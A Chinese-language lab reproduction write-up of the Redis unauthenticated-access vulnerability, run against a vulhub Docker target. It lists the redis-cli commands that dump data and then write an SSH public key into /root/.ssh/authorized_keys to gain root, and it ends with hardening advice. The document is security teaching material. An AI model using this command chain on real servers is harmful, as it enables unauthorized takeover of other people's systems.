# Redis 未授权访问漏洞
## 漏洞简介
Redis服务若配置对外监听0.0.0.0，并且没有设置访问密码，攻击者可无需认证直接远程连接Redis。可以读取内部数据，还可以利用Redis写文件功能，向服务器写入SSH公钥、WebShell，最终实现服务器权限获取。漏洞端口：6379

## 靶场环境启动
```bash
cd vulhub/redis/4-unacc
docker‑compose up -d
```
靶机容器 IP：172.18.0.2

## 复现步骤

1. 使用 redis‑cli 客户端直接连接目标，不需要输入密码
```
redis‑cli -h 172.18.0.2
```
2. 连接成功后执行 info 命令
```
info
```
漏洞现象：没有密码校验，直接返回 Redis 版本、操作系统、内存等大量敏感信息。

3. 获取全部 key 数据
```
keys *
```

## 漏洞利用：写入 SSH 公钥提权
```
config set dir /root/.ssh
config set dbfilename "authorized_keys"
set x "\n\nssh‑rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD...\n\n"
save
```

## 修复方案
```
1. 修改 redis 配置，设置 bind 127.0.0.1，只允许本机访问，禁止 0.0.0.0 对外开放。
2. 设置访问密码 requirepass 自定义强密码，所有客户端连接必须密码认证。
3. 防火墙策略，6379 端口禁止暴露公网，限制可信来源 IP 访问。
4. Redis 使用普通低权限用户启动，禁止 root 账号运行 redis，降低写文件授权风险。
```

